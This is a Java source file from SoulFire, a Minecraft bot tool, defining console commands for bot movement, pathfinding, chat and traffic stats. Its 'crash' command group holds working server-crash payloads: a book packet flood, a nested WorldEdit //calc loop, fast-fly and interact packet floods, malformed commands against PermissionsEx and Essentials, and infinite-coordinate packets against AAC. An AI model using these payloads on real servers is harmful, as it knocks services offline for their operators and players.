/*
 * SoulFire
 * Copyright (C) 2024  AlexProgrammerDE
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
package net.pistonmaster.soulfire.server;

import static com.mojang.brigadier.CommandDispatcher.ARGUMENT_SEPARATOR;
import static net.pistonmaster.soulfire.brigadier.BrigadierHelper.argument;
import static net.pistonmaster.soulfire.brigadier.BrigadierHelper.help;
import static net.pistonmaster.soulfire.brigadier.BrigadierHelper.literal;
import static net.pistonmaster.soulfire.brigadier.BrigadierHelper.privateCommand;

import com.github.steveice10.mc.protocol.data.game.entity.RotationOrigin;
import com.github.steveice10.mc.protocol.data.game.entity.player.Hand;
import com.github.steveice10.mc.protocol.data.game.entity.player.InteractAction;
import com.github.steveice10.mc.protocol.packet.common.serverbound.ServerboundCustomPayloadPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundInteractPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundMovePlayerPosPacket;
import com.mojang.brigadier.Command;
import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.DoubleArgumentType;
import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import com.mojang.brigadier.suggestion.Suggestion;
import com.mojang.brigadier.tree.CommandNode;
import it.unimi.dsi.fastutil.booleans.Boolean2ObjectFunction;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.time.Instant;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.function.ToIntFunction;
import javax.annotation.PostConstruct;
import javax.imageio.ImageIO;
import javax.inject.Inject;
import lombok.Getter;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import net.pistonmaster.soulfire.brigadier.CommandHelpWrapper;
import net.pistonmaster.soulfire.brigadier.ConsoleSubject;
import net.pistonmaster.soulfire.server.api.SoulFireAPI;
import net.pistonmaster.soulfire.server.api.event.EventUtil;
import net.pistonmaster.soulfire.server.api.event.bot.BotPreTickEvent;
import net.pistonmaster.soulfire.server.api.event.lifecycle.DispatcherInitEvent;
import net.pistonmaster.soulfire.server.pathfinding.BotEntityState;
import net.pistonmaster.soulfire.server.pathfinding.RouteFinder;
import net.pistonmaster.soulfire.server.pathfinding.execution.PathExecutor;
import net.pistonmaster.soulfire.server.pathfinding.execution.WorldAction;
import net.pistonmaster.soulfire.server.pathfinding.goals.GoalScorer;
import net.pistonmaster.soulfire.server.pathfinding.goals.PosGoal;
import net.pistonmaster.soulfire.server.pathfinding.goals.XZGoal;
import net.pistonmaster.soulfire.server.pathfinding.goals.YGoal;
import net.pistonmaster.soulfire.server.pathfinding.graph.MinecraftGraph;
import net.pistonmaster.soulfire.server.pathfinding.graph.ProjectedInventory;
import net.pistonmaster.soulfire.server.pathfinding.graph.ProjectedLevelState;
import net.pistonmaster.soulfire.server.protocol.BotConnection;
import net.pistonmaster.soulfire.util.SFPathConstants;
import org.apache.commons.io.FileUtils;
import org.cloudburstmc.math.vector.Vector3d;

@Slf4j
@RequiredArgsConstructor(onConstructor_ = @Inject)
public class ServerCommandManager {
  @Getter private final CommandDispatcher<ConsoleSubject> dispatcher = new CommandDispatcher<>();
  private final SoulFireServer soulFireServer;
  private final List<Map.Entry<Instant, String>> commandHistory =
      Collections.synchronizedList(new ArrayList<>());
  private final Path targetFile = SFPathConstants.DATA_FOLDER.resolve(".command_history");

  @PostConstruct
  public void postConstruct() {
    loadCommandHistory();

    // Help
    dispatcher.register(
        literal("help")
            .executes(
                help(
                    "Prints a list of all available commands",
                    c -> {
                      c.getSource().sendMessage("Available commands:");
                      for (var command : getAllUsage(dispatcher.getRoot(), c.getSource(), false)) {
                        c.getSource()
                            .sendMessage(
                                String.format("%s: %s", command.command(), command.help()));
                      }

                      return Command.SINGLE_SUCCESS;
                    })));
    dispatcher.register(
        literal("help-markdown")
            .executes(
                privateCommand(
                    c -> {
                      for (var command : getAllUsage(dispatcher.getRoot(), c.getSource(), false)) {
                        c.getSource()
                            .sendMessage(
                                String.format("| `%s` | %s |", command.command(), command.help()));
                      }

                      return Command.SINGLE_SUCCESS;
                    })));

    // GUI and CLI commands
    dispatcher.register(
        literal("reload-history")
            .executes(
                help(
                    "Refreshes the loaded command history from the data file",
                    c -> {
                      loadCommandHistory();

                      return Command.SINGLE_SUCCESS;
                    })));
    dispatcher.register(
        literal("clear-history")
            .executes(
                help(
                    "Wipes the command history data",
                    c -> {
                      clearCommandHistory();

                      return Command.SINGLE_SUCCESS;
                    })));

    // Pathfinding
    dispatcher.register(
        literal("walk")
            .then(
                argument("y", IntegerArgumentType.integer())
                    .executes(
                        help(
                            "Makes all connected bots walk to the y coordinates",
                            c -> {
                              var y = IntegerArgumentType.getInteger(c, "y");
                              return executePathfinding(c, new YGoal(y));
                            })))
            .then(
                argument("x", IntegerArgumentType.integer())
                    .then(
                        argument("z", IntegerArgumentType.integer())
                            .executes(
                                help(
                                    "Makes all connected bots walk to the xz coordinates",
                                    c -> {
                                      var x = IntegerArgumentType.getInteger(c, "x");
                                      var z = IntegerArgumentType.getInteger(c, "z");

                                      return executePathfinding(c, new XZGoal(x, z));
                                    }))))
            .then(
                argument("x", IntegerArgumentType.integer())
                    .then(
                        argument("y", IntegerArgumentType.integer())
                            .then(
                                argument("z", IntegerArgumentType.integer())
                                    .executes(
                                        help(
                                            "Makes all connected bots walk to the xyz coordinates",
                                            c -> {
                                              var x = IntegerArgumentType.getInteger(c, "x");
                                              var y = IntegerArgumentType.getInteger(c, "y");
                                              var z = IntegerArgumentType.getInteger(c, "z");

                                              return executePathfinding(c, new PosGoal(x, y, z));
                                            }))))));
    dispatcher.register(
        literal("stop-path")
            .executes(
                help(
                    "Makes all connected bots stop pathfinding",
                    c ->
                        forEveryBot(
                            c,
                            bot -> {
                              EventUtil.runAndAssertChanged(
                                  bot.eventBus(),
                                  () ->
                                      bot.eventBus()
                                          .unregisterAll(
                                              BotPreTickEvent.class,
                                              (clazz, o) -> {
                                                if (PathExecutor.class.isAssignableFrom(clazz)) {
                                                  ((PathExecutor) o.orElseThrow()).cancel();
                                                  return true;
                                                }

                                                return false;
                                              }));

                              bot.sessionDataManager().controlState().resetAll();

                              c.getSource()
                                  .sendMessage(
                                      "Stopped pathfinding for "
                                          + bot.meta().minecraftAccount().username());
                              return Command.SINGLE_SUCCESS;
                            }))));

    // Movement controls
    dispatcher.register(
        literal("lookat")
            .then(
                argument("x", DoubleArgumentType.doubleArg())
                    .then(
                        argument("y", DoubleArgumentType.doubleArg())
                            .then(
                                argument("z", DoubleArgumentType.doubleArg())
                                    .executes(
                                        help(
                                            "Makes all connected bots look at the block at the xyz coordinates",
                                            c -> {
                                              var x = DoubleArgumentType.getDouble(c, "x");
                                              var y = DoubleArgumentType.getDouble(c, "y");
                                              var z = DoubleArgumentType.getDouble(c, "z");

                                              return forEveryBot(
                                                  c,
                                                  bot -> {
                                                    bot.sessionDataManager()
                                                        .clientEntity()
                                                        .lookAt(
                                                            RotationOrigin.EYES,
                                                            Vector3d.from(x, y, z));
                                                    return Command.SINGLE_SUCCESS;
                                                  });
                                            }))))));
    dispatcher.register(
        literal("move")
            .then(
                literal("forward")
                    .executes(
                        help(
                            "Toggle walking forward for all connected bots",
                            c ->
                                forEveryBot(
                                    c,
                                    bot -> {
                                      var controlState = bot.sessionDataManager().controlState();

                                      controlState.forward(!controlState.forward());
                                      controlState.backward(false);
                                      return Command.SINGLE_SUCCESS;
                                    }))))
            .then(
                literal("backward")
                    .executes(
                        help(
                            "Toggle walking backward for all connected bots",
                            c ->
                                forEveryBot(
                                    c,
                                    bot -> {
                                      var controlState = bot.sessionDataManager().controlState();

                                      controlState.backward(!controlState.backward());
                                      controlState.forward(false);
                                      return Command.SINGLE_SUCCESS;
                                    }))))
            .then(
                literal("left")
                    .executes(
                        help(
                            "Toggle walking left for all connected bots",
                            c ->
                                forEveryBot(
                                    c,
                                    bot -> {
                                      var controlState = bot.sessionDataManager().controlState();

                                      controlState.left(!controlState.left());
                                      controlState.right(false);
                                      return Command.SINGLE_SUCCESS;
                                    }))))
            .then(
                literal("right")
                    .executes(
                        help(
                            "Toggle walking right for all connected bots",
                            c ->
                                forEveryBot(
                                    c,
                                    bot -> {
                                      var controlState = bot.sessionDataManager().controlState();

                                      controlState.right(!controlState.right());
                                      controlState.left(false);
                                      return Command.SINGLE_SUCCESS;
                                    })))));
    dispatcher.register(
        literal("jump")
            .executes(
                help(
                    "Toggle jumping for all connected bots",
                    c ->
                        forEveryBot(
                            c,
                            bot -> {
                              var controlState = bot.sessionDataManager().controlState();

                              controlState.jumping(!controlState.jumping());
                              return Command.SINGLE_SUCCESS;
                            }))));
    dispatcher.register(
        literal("sneak")
            .executes(
                help(
                    "Toggle sneaking for all connected bots",
                    c ->
                        forEveryBot(
                            c,
                            bot -> {
                              bot.botControl().toggleSneak();
                              return Command.SINGLE_SUCCESS;
                            }))));
    dispatcher.register(
        literal("reset")
            .executes(
                help(
                    "Resets the movement of all connected bots",
                    c ->
                        forEveryBot(
                            c,
                            bot -> {
                              bot.sessionDataManager().controlState().resetAll();
                              return Command.SINGLE_SUCCESS;
                            }))));

    // Attack controls
    dispatcher.register(
        literal("stop-attack")
            .executes(
                help(
                    "Stops the ongoing attacks",
                    c ->
                        forEveryAttack(
                            c,
                            attackManager -> {
                              soulFireServer.stopAttack(attackManager.id());
                              return Command.SINGLE_SUCCESS;
                            }))));

    // Utility commands
    dispatcher.register(
        literal("online")
            .executes(
                help(
                    "Shows connected bots from all attacks",
                    c ->
                        forEveryAttackEnsureHasBots(
                            c,
                            attackManager -> {
                              var online = new ArrayList<String>();
                              for (var bot : attackManager.botConnections()) {
                                if (!bot.isOnline()) {
                                  continue;
                                }

                                online.add(bot.meta().minecraftAccount().username());
                              }

                              c.getSource()
                                  .sendMessage(
                                      online.size() + " bots online: " + String.join(", ", online));
                              return Command.SINGLE_SUCCESS;
                            }))));
    dispatcher.register(
        literal("say")
            .then(
                argument("message", StringArgumentType.greedyString())
                    .executes(
                        help(
                            "Makes all connected bots send a message in chat or execute a command",
                            c -> {
                              var message = StringArgumentType.getString(c, "message");

                              return forEveryBot(
                                  c,
                                  bot -> {
                                    if (!bot.isOnline()) {
                                      return Command.SINGLE_SUCCESS;
                                    }

                                    bot.botControl().sendMessage(message);

                                    return Command.SINGLE_SUCCESS;
                                  });
                            }))));
    dispatcher.register(
        literal("stats")
            .executes(
                help(
                    "Shows network stats",
                    c ->
                        forEveryAttackEnsureHasBots(
                            c,
                            attackManager -> {
                              log.info("Total bots: {}", attackManager.botConnections().size());
                              long readTraffic = 0;
                              long writeTraffic = 0;
                              for (var bot : attackManager.botConnections()) {
                                var trafficShapingHandler = bot.getTrafficHandler();

                                if (trafficShapingHandler == null) {
                                  continue;
                                }

                                readTraffic +=
                                    trafficShapingHandler.trafficCounter().cumulativeReadBytes();
                                writeTraffic +=
                                    trafficShapingHandler.trafficCounter().cumulativeWrittenBytes();
                              }

                              log.info(
                                  "Total read traffic: {}",
                                  FileUtils.byteCountToDisplaySize(readTraffic));
                              log.info(
                                  "Total write traffic: {}",
                                  FileUtils.byteCountToDisplaySize(writeTraffic));

                              long currentReadTraffic = 0;
                              long currentWriteTraffic = 0;
                              for (var bot : attackManager.botConnections()) {
                                var trafficShapingHandler = bot.getTrafficHandler();

                                if (trafficShapingHandler == null) {
                                  continue;
                                }

                                currentReadTraffic +=
                                    trafficShapingHandler.trafficCounter().lastReadThroughput();
                                currentWriteTraffic +=
                                    trafficShapingHandler.trafficCounter().lastWriteThroughput();
                              }

                              log.info(
                                  "Current read traffic: {}/s",
                                  FileUtils.byteCountToDisplaySize(currentReadTraffic));
                              log.info(
                                  "Current write traffic: {}/s",
                                  FileUtils.byteCountToDisplaySize(currentWriteTraffic));

                              return Command.SINGLE_SUCCESS;
                            }))));
    dispatcher.register(
        literal("export-map")
            .then(
                argument("map_id", IntegerArgumentType.integer())
                    .executes(
                        help(
                            "Exports a image of a map item by map id. Can be a held item or in a item-frame.",
                            c -> {
                              var mapId = IntegerArgumentType.getInteger(c, "map_id");
                              var currentTime = System.currentTimeMillis();

                              return forEveryBot(
                                  c,
                                  bot -> {
                                    var mapDataState =
                                        bot.sessionDataManager().mapDataStates().get(mapId);
                                    if (mapDataState == null) {
                                      c.getSource().sendMessage("Map not found!");
                                      return Command.SINGLE_SUCCESS;
                                    }

                                    var image = mapDataState.toBufferedImage();
                                    var fileName =
                                        "map_"
                                            + mapId
                                            + "_"
                                            + currentTime
                                            + "_"
                                            + bot.meta().minecraftAccount().username()
                                            + ".png";
                                    try {
                                      Files.createDirectories(SFPathConstants.MAPS_FOLDER);
                                      var file = SFPathConstants.MAPS_FOLDER.resolve(fileName);
                                      ImageIO.write(image, "png", file.toFile());
                                      c.getSource().sendMessage("Exported map to " + file);
                                    } catch (IOException e) {
                                      log.error("Failed to export map!", e);
                                    }

                                    return Command.SINGLE_SUCCESS;
                                  });
                            }))));

    dispatcher.register(
        literal("crash")
            .then(
                literal("book")
                    .executes(
                        help(
                            "Attempts to crash the server with a book",
                            c -> {
                              log.info("Attempting to crash the server with a book");

                              try {
                                var data = Files.readAllBytes(Path.of("book.cap"));
                                var packet = new ServerboundCustomPayloadPacket("MC|BSign", data);
                                return forEveryBot(
                                    c,
                                    (bot) -> {
                                      for (var i = 0; i < 150; i++) {
                                        bot.sessionDataManager().sendPacket(packet);
                                      }
                                      return Command.SINGLE_SUCCESS;
                                    });
                              } catch (IOException e) {
                                log.error("Failed to read book.cap", e);
                                return Command.SINGLE_SUCCESS;
                              }
                            })))
            .then(
                literal("calc")
                    .executes(
                        help(
                            "Attempts to crash the server with a WorldEdit calculation",
                            c -> {
                              log.info("Attempting to crash the server with a WorldEdit calculation");

                              return forEveryBot(
                                  c,
                                  (bot) -> {
                                    bot.botControl()
                                        .sendMessage(
                                            "//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}");
                                    return Command.SINGLE_SUCCESS;
                                  });
                            })))
            .then(
                literal("fly")
                    .executes(
                        help(
                            "Attempts to crash the server with flying fast",
                            c -> {
                              log.info("Attempting to crash the server with flying fast");

                              return forEveryBot(
                                  c,
                                  (bot) -> {
                                    var botX = bot.sessionDataManager().clientEntity().x();
                                    var botY = bot.sessionDataManager().clientEntity().y();
                                    var botZ = bot.sessionDataManager().clientEntity().z();

                                    while (botY < 256) {
                                      botY += 9;
                                      var packet =
                                          new ServerboundMovePlayerPosPacket(
                                              true, botX, botY, botZ);
                                      bot.sessionDataManager().sendPacket(packet);
                                    }

                                    for (var i = 0; i < 10000; i++) {
                                      botX += 9;
                                      var packet =
                                          new ServerboundMovePlayerPosPacket(
                                              true, botX, botY, botZ);
                                      bot.sessionDataManager().sendPacket(packet);
                                    }

                                    return Command.SINGLE_SUCCESS;
                                  });
                            })))
            .then(
                literal("sleep")
                    .executes(
                        help(
                            "Attempts to crash the server with sleeping",
                            c -> {
                              log.info("Attempting to crash the server with sleeping");

                              return forEveryBot(
                                  c,
                                  (bot) -> {

                                    // TODO: 17/02/2024 check if there is a specific packet for
                                    // leaving bed
                                    var packet =
                                        new ServerboundInteractPacket(
                                            bot.sessionDataManager().clientEntity().entityId(),
                                            InteractAction.INTERACT,
                                            Hand.MAIN_HAND,
                                            false);

                                    for (var i = 0; i < 2000; i++) {
                                      bot.sessionDataManager().sendPacket(packet);
                                    }

                                    return Command.SINGLE_SUCCESS;
                                  });
                            })))
            .then(
                literal("permissionsex")
                    .executes(
                        help(
                            "Attempts to crash the server with PermissionsEx",
                            c -> {
                              log.info("Attempting to crash the server with PermissionsEx");

                              return forEveryBot(
                                  c,
                                  (bot) -> {
                                    bot.botControl().sendMessage("/promote * a");
                                    return Command.SINGLE_SUCCESS;
                                  });
                            })))
            .then(
                literal("aac")
                    .executes(
                        help(
                            "Attempts to crash the server with AAC",
                            c -> {
                              log.info("Attempting to crash the server with AAC");
                              // TODO: 17/02/2024 find old version of AAC crack to test
                              var packet =
                                  new ServerboundMovePlayerPosPacket(
                                      true,
                                      Double.NEGATIVE_INFINITY,
                                      Double.NEGATIVE_INFINITY,
                                      Double.NEGATIVE_INFINITY);
                              return forEveryBot(
                                  c,
                                  (bot) -> {
                                    bot.sessionDataManager().sendPacket(packet);
                                    return Command.SINGLE_SUCCESS;
                                  });
                            })))
            .then(
                literal("essentials")
                    .executes(
                        help(
                            "Attempts to crash the server with Essentials",
                            c -> {
                              log.info("Attempting to crash the server with Essentials");

                              return forEveryBot(
                                  c,
                                  (bot) -> {
                                    bot.botControl().sendMessage("/pay * a a");
                                    return Command.SINGLE_SUCCESS;
                                  });
                            })))
            .then(
                literal("anvil")
                    .executes(
                        help(
                            "Attempts to crash the server with an anvil",
                            c -> {
                              log.info("Attempting to crash the server with an anvil");

                              log.error("Anvil crash is not implemented yet!");

                              // try damage 3 and 16384
                              return Command.SINGLE_SUCCESS;
                            })))
            .then(
                literal("chest")
                    .executes(
                        help(
                            "Attempts to crash the server with a chest",
                            c -> {
                              log.info("Attempting to crash the server with a chest");

                              log.error("Chest crash is not implemented yet!");

                              // create huge NBT data on chest and place the most possible chest
                              // to "crash" the area
                              return Command.SINGLE_SUCCESS;
                            }))));

    SoulFireAPI.postEvent(new DispatcherInitEvent(dispatcher));

    dispatcher.register(
        literal("bot")
            .then(
                argument("bot_name", StringArgumentType.string())
                    .redirect(
                        dispatcher.getRoot(),
                        c -> {
                          c.getSource()
                              .extraData
                              .put("bot_name", StringArgumentType.getString(c, "bot_name"));
                          return c.getSource();
                        })));

    dispatcher.register(
        literal("attack")
            .then(
                argument("attack_id", IntegerArgumentType.integer(0))
                    .redirect(
                        dispatcher.getRoot(),
                        c -> {
                          c.getSource()
                              .extraData
                              .put("attack_id", IntegerArgumentType.getInteger(c, "attack_id"));
                          return c.getSource();
                        })));
  }

  private int forEveryAttack(
      CommandContext<ConsoleSubject> context, ToIntFunction<AttackManager> consumer) {
    if (soulFireServer.attacks().isEmpty()) {
      log.warn("No attacks found!");
      return 2;
    }

    var resultCode = Command.SINGLE_SUCCESS;
    for (var attackManager : soulFireServer.attacks().values()) {
      if (context.getSource().extraData.containsKey("attack_id")
          && context.getSource().extraData.get("attack_id").equals(attackManager.id())) {
        continue;
      }

      log.info("--- Running command for attack {} ---", attackManager.id());
      var result = consumer.applyAsInt(attackManager);
      if (result != Command.SINGLE_SUCCESS) {
        resultCode = result;
      }
    }

    return resultCode;
  }

  private int forEveryAttackEnsureHasBots(
      CommandContext<ConsoleSubject> context, ToIntFunction<AttackManager> consumer) {
    return forEveryAttack(
        context,
        attackManager -> {
          if (attackManager.botConnections().isEmpty()) {
            log.warn("No bots connected!");
            return 3;
          }

          return consumer.applyAsInt(attackManager);
        });
  }

  private int forEveryBot(
      CommandContext<ConsoleSubject> context, ToIntFunction<BotConnection> consumer) {
    return forEveryAttackEnsureHasBots(
        context,
        attackManager -> {
          var resultCode = Command.SINGLE_SUCCESS;
          for (var bot : attackManager.botConnections()) {
            if (context.getSource().extraData.containsKey("bot_name")
                && !bot.meta()
                    .minecraftAccount()
                    .username()
                    .equals(context.getSource().extraData.get("bot_name"))) {
              continue;
            }

            log.info(
                "--- Running command for bot {} ---", bot.meta().minecraftAccount().username());
            var result = consumer.applyAsInt(bot);
            if (result != Command.SINGLE_SUCCESS) {
              resultCode = result;
            }
          }

          return resultCode;
        });
  }

  private int executePathfinding(CommandContext<ConsoleSubject> context, GoalScorer goalScorer) {
    return forEveryBot(
        context,
        bot -> {
          var logger = bot.logger();
          var executorService = bot.executorManager().newExecutorService(bot, "PathfindingManager");
          executorService.execute(
              () -> {
                var sessionDataManager = bot.sessionDataManager();
                var clientEntity = sessionDataManager.clientEntity();
                var routeFinder =
                    new RouteFinder(new MinecraftGraph(sessionDataManager.tagsState()), goalScorer);

                Boolean2ObjectFunction<List<WorldAction>> findPath =
                    requiresRepositioning -> {
                      var start =
                          BotEntityState.initialState(
                              clientEntity,
                              new ProjectedLevelState(
                                  Objects.requireNonNull(
                                          sessionDataManager.getCurrentLevel(), "Level is null!")
                                      .chunks()
                                      .immutableCopy()),
                              new ProjectedInventory(
                                  sessionDataManager.inventoryManager().playerInventory()));
                      logger.info("Starting calculations at: {}", start);
                      var actions = routeFinder.findRoute(start, requiresRepositioning);
                      logger.info("Calculated path with {} actions: {}", actions.size(), actions);
                      return actions;
                    };

                var pathExecutor =
                    new PathExecutor(bot, findPath.get(true), findPath, executorService);
                pathExecutor.register();
              });

          return Command.SINGLE_SUCCESS;
        });
  }

  public List<Map.Entry<Instant, String>> getCommandHistory() {
    synchronized (commandHistory) {
      return List.copyOf(commandHistory);
    }
  }

  public int execute(String command) {
    command = command.strip();

    try {
      var result = dispatcher.execute(command, new ConsoleSubject());
      commandHistory.add(Map.entry(Instant.now(), command));

      // Only save successful commands
      if (result == Command.SINGLE_SUCCESS) {
        newCommandHistoryEntry(command);
      }

      return result;
    } catch (CommandSyntaxException e) {
      log.warn(e.getMessage());
      return Command.SINGLE_SUCCESS;
    }
  }

  private void loadCommandHistory() {
    synchronized (commandHistory) {
      commandHistory.clear();
      try {
        if (!Files.exists(targetFile)) {
          return;
        }

        var lines = Files.readAllLines(targetFile);
        for (var line : lines) {
          var firstColon = line.indexOf(':');
          if (firstColon == -1) {
            continue;
          }

          var seconds = Long.parseLong(line.substring(0, firstColon));
          var command = line.substring(firstColon + 1);

          commandHistory.add(Map.entry(Instant.ofEpochSecond(seconds), command));
        }
      } catch (IOException e) {
        log.error("Failed to create command history file!", e);
      }
    }
  }

  private void newCommandHistoryEntry(String command) {
    synchronized (commandHistory) {
      try {
        Files.createDirectories(targetFile.getParent());
        var newLine = Instant.now().getEpochSecond() + ":" + command + System.lineSeparator();
        Files.writeString(
            targetFile, newLine, StandardOpenOption.CREATE, StandardOpenOption.APPEND);
      } catch (IOException e) {
        log.error("Failed to create command history file!", e);
      }
    }
  }

  private void clearCommandHistory() {
    synchronized (commandHistory) {
      try {
        Files.deleteIfExists(targetFile);
        commandHistory.clear();
      } catch (IOException e) {
        log.error("Failed to delete command history file!", e);
      }
    }
  }

  public List<String> getCompletionSuggestions(String command) {
    return dispatcher
        .getCompletionSuggestions(dispatcher.parse(command, new ConsoleSubject()))
        .join()
        .getList()
        .stream()
        .map(Suggestion::getText)
        .toList();
  }

  private HelpData[] getAllUsage(
      final CommandNode<ConsoleSubject> node,
      final ConsoleSubject source,
      final boolean restricted) {
    final var result = new ArrayList<HelpData>();
    getAllUsage(node, source, result, "", restricted);
    return result.toArray(new HelpData[0]);
  }

  private void getAllUsage(
      final CommandNode<ConsoleSubject> node,
      final ConsoleSubject source,
      final ArrayList<HelpData> result,
      final String prefix,
      final boolean restricted) {
    if (restricted && !node.canUse(source)) {
      return;
    }

    if (node.getCommand() != null) {
      if (node.getCommand() instanceof CommandHelpWrapper helpWrapper) {
        if (!helpWrapper.privateCommand()) {
          result.add(new HelpData(prefix, helpWrapper.help()));
        }
      } else {
        result.add(new HelpData(prefix, "N/A"));
      }
    }

    if (node.getRedirect() != null) {
      final var redirect =
          node.getRedirect() == dispatcher.getRoot()
              ? "..."
              : "-> " + node.getRedirect().getUsageText();
      result.add(
          new HelpData(
              prefix.isEmpty()
                  ? node.getUsageText() + ARGUMENT_SEPARATOR + redirect
                  : prefix + ARGUMENT_SEPARATOR + redirect,
              "N/A"));
    } else if (!node.getChildren().isEmpty()) {
      for (final var child : node.getChildren()) {
        getAllUsage(
            child,
            source,
            result,
            prefix.isEmpty()
                ? child.getUsageText()
                : prefix + ARGUMENT_SEPARATOR + child.getUsageText(),
            restricted);
      }
    }
  }

  private record HelpData(String command, String help) {}
}
